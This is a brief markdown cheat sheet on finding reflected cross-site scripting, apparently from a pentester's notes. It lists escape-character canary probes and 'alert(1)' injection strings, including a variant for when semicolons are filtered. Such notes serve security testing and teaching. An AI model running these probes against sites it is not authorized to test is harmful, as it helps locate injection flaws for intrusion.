# XSS Discovery

## Reflective Discovery

### Escape Characters
```
`
# `canary
```
Check page source to verify text displays properly or to see errors

### Alerts
```
';alert(1);'canary

# Sometimes semicolon is blocked
'+alert(1)+'canary
```


